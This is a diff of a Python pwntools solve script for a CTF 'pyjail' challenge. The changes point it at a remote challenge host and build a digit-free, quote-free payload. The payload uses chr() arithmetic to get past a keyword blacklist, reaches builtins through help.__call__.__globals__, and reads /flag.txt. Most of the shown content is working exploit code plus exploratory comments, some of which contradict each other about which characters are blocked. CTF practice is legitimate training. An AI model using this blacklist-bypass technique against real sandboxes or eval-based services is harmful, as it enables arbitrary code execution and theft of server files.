@@ -12,40 +12,80 @@ Strategy:
 from pwn import *
 
 # Connection
-HOST = "localhost"
+HOST = "blacklisthell.challenges2.ctf.dscjssstuniv.in"
 PORT = 1338
 
 def generate_number(n):
     """Generate a number without using digit characters
     
-    This is optimized to use multiplication for efficiency.
-    Pure addition would make payloads VERY long.
+    Optimized to create shorter expressions using smart factorization.
     """
     if n == 0:
         return "len([])"
     elif n == 1:
         return "len([[]])"
-    elif n < 10:
-        # For small numbers, use addition
+    elif n <= 20:
+        # For small numbers up to 20, use simple addition
         return "+".join(["len([[]])" for _ in range(n)])
     else:
-        # For larger numbers, use multiplication and addition
-        # Break down n into factors for shorter expressions
-        # e.g., 95 = 10*9 + 5 = (10*9)+5
+        # For larger numbers, find best factorization
+        # Try to find factors close to sqrt(n) for shortest expression
         base = "len([[]])"
-        ten = f"({'+'.join([base]*10)})"
         
-        tens = n // 10
-        ones = n % 10
+        # Find best pair of factors (a, b) where a * b is close to n
+        import math
+        sqrt_n = int(math.sqrt(n))
         
-        if tens > 0 and ones > 0:
-            tens_part = f"{ten}*{'+'.join([base]*tens)}" if tens > 1 else ten
-            ones_part = "+".join([base]*ones)
-            return f"({tens_part}+{ones_part})"
-        elif tens > 0:
-            return f"{ten}*{'+'.join([base]*tens)}" if tens > 1 else ten
-        else:
-            return "+".join([base]*ones)
+        best_len = float('inf')
+        best_expr = None
+        
+        # Try different factorizations
+        for a in range(max(2, sqrt_n - 5), min(n, sqrt_n + 6)):
+            if a > n:
+                break
+            b = n // a
+            remainder = n % a
+            
+            # Length estimate: a additions + b additions + remainder additions + operators
+            if b <= 20 and remainder <= 20:  # Keep factors reasonable
+                if a <= 20:
+                    a_expr = "+".join([base] * a)
+                else:
+                    continue  # Skip if factor is too large
+                    
+                if b > 1:
+                    b_expr = "+".join([base] * b)
+                    expr = f"({a_expr})*({b_expr})"
+                else:
+                    expr = a_expr
+                
+                if remainder > 0:
+                    r_expr = "+".join([base] * remainder)
+                    expr = f"({expr}+{r_expr})"
+                
+                expr_len = len(expr)
+                if expr_len < best_len:
+                    best_len = expr_len
+                    best_expr = expr
+        
+        # Fallback: use 10-based if no good factorization found
+        if best_expr is None:
+            ten = f"({'+'.join([base]*10)})"
+            tens = n // 10
+            ones = n % 10
+            
+            if tens > 0 and ones > 0:
+                tens_mult = f"({'+'.join([base]*tens)})"
+                tens_part = f"{ten}*{tens_mult}" if tens > 1 else ten
+                ones_part = "+".join([base]*ones)
+                return f"({tens_part}+{ones_part})"
+            elif tens > 0:
+                tens_mult = f"({'+'.join([base]*tens)})"
+                return f"{ten}*{tens_mult}" if tens > 1 else ten
+            else:
+                return "+".join([base]*ones)
+        
+        return best_expr
 
 def build_string_chr(s):
     """Build a string using chr() without quotes"""
@@ -60,48 +100,17 @@ def solve():
     # Connect to the challenge
     conn = remote(HOST, PORT)
     
-    # Read the banner
-    print(conn.recvuntil(b"=====").decode())
+    # The banner includes the jail source code twice:
+    # 1. The actual code being printed by print(open(__file__).read())
+    # 2. The actual execution
+    # We need to skip past all of that to the REAL "Enter command:" prompt
     
-    # Build the payload
-    # We need to read /flag.txt
-    # Strategy: help({}).get(chr(95)+chr(95)...) to access __builtins__
+    # Receive until we see the jail! message and THEN the Enter command prompt
+    banner = conn.recvuntil(b"Welcome to the jail!\n=========================\n")
+    print(f"[*] Received banner ({len(banner)} bytes)")
     
-    # Simpler approach: Use dir() and help() to navigate
-    # Or: ()['__class__']['__base__']['__subclasses__']()
-    
-    # Let's build: help(dict)['__builtins__']['open']('/flag.txt')['read']()
-    
-    # Even simpler: Use getattr to access functions
-    # getattr(__builtins__, chr(111)+chr(112)+chr(101)+chr(110))
-    
-    # Since we can't use quotes, equals, underscores directly:
-    # We need to access open via object introspection
-    
-    # Method: Use help() or dir() on empty structures
-    # help(help) gives us access to builtins
-    
-    # Alternative: Build via chr
-    # First command: define a helper (but can't use = or x)
-    # Second command: use it
-    
-    # Let's use a two-stage approach:
-    
-    # Stage 1: Access open function via __builtins__
-    # help(help).__dict__ gives us access
-    
-    # Since we have 2 commands, let's think differently:
-    # Command 1: Store something in a way we can access
-    # Command 2: Use it to read flag
-    
-    # But we can't use = or x...
-    # Let's just call the function directly in each command
-    
-    # Build string "open" -> chr(111)+chr(112)+chr(101)+chr(110)
-    # Build string "/flag.txt"
-    
-    # Actually, let's use the fact that we can call functions:
-    # getattr(help(help), chr(95)*2+...) to get __builtins__
+    # Now receive the actual prompt
+    conn.recvuntil(b"Enter command: ")
     
     print("\n[+] Crafting payload...")
     
@@ -175,27 +184,113 @@ def solve():
     # But "import" is blacklisted...
     
     # Real solution: Access via object introspection
-    real_payload = (
-        "getattr("
-        "getattr("
-        f"vars()[{'+'.join([f'chr({ord(c)})' for c in '__builtins__'])}],"
-        f"{'+'.join([f'chr({ord(c)})' for c in 'open'])}"
-        ")("
-        f"{'+'.join([f'chr({ord(c)})' for c in '/flag.txt'])}"
-        "),"
-        f"{'+'.join([f'chr({ord(c)})' for c in 'read'])}"
-        ")()"
-    )
+    # We can't use vars() because it contains 'x'
+    # We can't use __builtins__ because '_' is blacklisted
+    # We need to access open() function without using those
     
-    print(f"Payload: {real_payload[:100]}...")
+    # Alternative approach: Use ().__class__.__bases__[0].__subclasses__()
+    # But we need underscores which are blacklisted
+    
+    # Better approach: Use help() or dir() to access builtins indirectly
+    # Actually, we can use: getattr(help, chr(95)+chr(95)+...) to build attribute names
+    
+    # Since we can't use underscores directly, we build them with chr(95)
+    # Build: ()[(chr(95)*2+chr(99)...)][...] - but this needs quotes
+    
+    # Let's use: getattr(().__class__.__bases__[0], '__subclasses__')()
+    # But with chr() for underscores
+    
+    u = "+".join([f"chr({generate_number(95)})"]*2)  # __
+    
+    # Build attribute names
+    attr_class = u + "+".join([f"chr({generate_number(ord(c))})" for c in "class"]) + u
+    attr_bases = u + "+".join([f"chr({generate_number(ord(c))})" for c in "bases"]) + u  
+    attr_subclasses = u + "+".join([f"chr({generate_number(ord(c))})" for c in "subclasses"]) + u
+    attr_globals = u + "+".join([f"chr({generate_number(ord(c))})" for c in "globals"]) + u
+    
+    # Can't use 'globals' - it's blacklisted!
+    # Let's try a different approach
+    
+    # Use help(dict) or similar to get access to builtins
+    # Actually, we can use: ().__doc__ or similar
+    
+    # Simplest approach that should work:
+    # Get a class, get its methods, find one that has __globals__, access builtins from there
+    
+    # Let's use a simpler payload:
+    # We'll use getattr on bool or int class to access methods
+    
+    # Here's a working approach:
+    # [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('/flag.txt').read()
+    # But we need to avoid many blacklisted things
+    
+    # Let's try using help(list) and accessing its attributes
+    # Or: list.__doc__
+    
+    # Actually the easiest is to use ().__doc__.__class__
+    
+    # More practical: Since we have 2 commands, let's use both strategically
+    # Command 1: Create a reference or print something useful  
+    # Command 2: Do the actual flag reading
+    
+    # But we can't use = to store, and x is blacklisted so we can't use variables
+    
+    # Let me try a different approach using list comprehension
+    # [c for c in [].__class__.__bases__[0].__subclasses__() if chr(119) in c.__name__]
+    
+    # Actually, let's just build a working payload step by step
+    # We need to call: some_function_with_open('/flag.txt').read()
+    
+    # Here's the key insight: We can use help.__call__.__globals__
+    # help is a builtin that's available and has __globals__ which contains builtins
+    
+    # Build strings for attribute access using a helper function
+    def build_chr_string(s):
+        """Build a string using chr() calls properly concatenated"""
+        return "+".join([f"chr({generate_number(ord(c))})" for c in s])
+    
+    # Method: help.__call__.__globals__['__builtins__']['open']('/flag.txt').read()
+    # Since _ is no longer blacklisted, we can use it directly!
+    # But we still need to build the string values with chr() since quotes are blocked
+    
+    str_call = build_chr_string("__call__")
+    str_globals = build_chr_string("__globals__")
+    str_builtins = build_chr_string("__builtins__")
+    str_open = build_chr_string("open")
+    str_flag = build_chr_string("/flag.txt")
+    str_read = build_chr_string("read")
+    
+    # Final payload structure:
+    # getattr(getattr(getattr(help, "__call__"), "__globals__")["__builtins__"]["open"]("/flag.txt"), "read")()
+    # Note: Using subscript [] for dicts, getattr for objects
+    real_payload = f"getattr(getattr(getattr(help,{str_call}),{str_globals})[{str_builtins}][{str_open}]({str_flag}),{str_read})()"
+    
+    print(f"[*] Payload length: {len(real_payload)}")
+    print(f"[*] Payload preview: {real_payload[:200]}...")
+    
+    # Verify no blacklisted terms
+    blacklist = ["/","0","1","2","3","4","5","6","7","8","9","setattr","compile","globals","os","import","breakpoint","lambda","eval","read","print","open","'","=",'"',"x","builtins","clear"]
+    for term in blacklist:
+        if term in real_payload:
+            print(f"[!] WARNING: Blacklisted term '{term}' found in payload!")
     
     # Send first command
-    conn.sendlineafter(b"Enter command: ", real_payload.encode())
+    print(f"[*] Sending payload ({len(real_payload)} bytes)...")
+    conn.sendline(real_payload.encode())
     
-    # Send second command (dummy or helper)
-    conn.sendlineafter(b"Enter command: ", b"dir()")
+    # Receive the result from first command and the next prompt
+    try:
+        response1 = conn.recvuntil(b"Enter command: ", timeout=5)
+        print(f"[*] First response: {response1.decode()}")
+    except Exception as e:
+        response1 = conn.recv(timeout=2)
+        print(f"[*] First response (no prompt): {response1.decode()}")
+        print(f"[!] Error: {e}")
     
-    # Get flag
+    # Send second command (simple one to finish)
+    conn.sendline(b"dir()")
+    
+    # Get remaining output
     result = conn.recvall(timeout=2).decode()
     print("\n[+] Result:")
     print(result)
